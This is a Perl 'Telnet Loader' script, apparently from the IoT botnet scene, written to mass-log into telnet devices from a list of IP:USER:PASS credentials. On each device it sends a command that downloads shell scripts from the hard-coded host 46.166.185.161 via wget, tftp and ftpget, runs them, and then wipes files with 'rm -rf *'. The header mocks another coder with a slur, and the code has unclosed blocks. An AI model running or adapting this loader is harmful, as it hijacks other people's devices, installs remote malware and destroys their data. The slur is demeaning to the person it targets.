#!/usr/bin/perl
# - - - - - - - - - - - - - - - - - - - - - - - #
#        Telnet Loader v2.0
#   IP:USERNAME:PASSWORD format
#   Created because LNO_LIGHT is gay 
#   & doesn't know how to code a working loader
#   this is LNOs' gay python version
#   http://pastebin.com/SGKZY757
#   as you can see, it doesn't/won't
#   connect/execute the payload lool
#   so if you're dearest friends with
#   LNO_LiGHT please consist of showing
#   him this elegant code :)
# - - - - - - - - - - - - - - - - - - - - - - - #
#   Usage: perl telnet_loader.pl telnet_list.txt
#   Format: IP:USER:PASS
# - - - - - - - - - - - - - - - - - - - - - - - #
#!/usr/bin/perl

if (@ARGV < 1)
{
	print "Usage: perl " . $0 . " <list>\n";
	exit;
}
use Net::Telnet;use Parallel::ForkManager;

my $checkTelnet = true;
my $botCmd = 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.161/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 46.166.185.161 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 46.166.185.161; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.161 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\n';
my $worker = new Parallel::ForkManager(1024); open(fh, "<", @ARGV[0]); @login; while (<fh>)
{
	@array = split(":", $_); push(@login, @array);
}
for (my $i = 0; $i < scalar(@login); $i += 3)
{
	$worker->start and next;
	$a = $i; # IP Address
	$b = $i + 1; # Username
	$c = $i + 2; # Password
	my $telnet = new Net::Telnet();
	if($checkTelnet && $telnet->open(Host=>$login[$a], Timeout=>30))
	{
		my$res=$telnet->login($login[$b],$login[$c]);
		if ($res){
	 		$telnet->cmd($botCmd);
			sleep 30;
			print "[\033[32m+\033[37m] Command sent $login[$a]\n";
	$worker->finish;
}
$worker->wait_all_children;
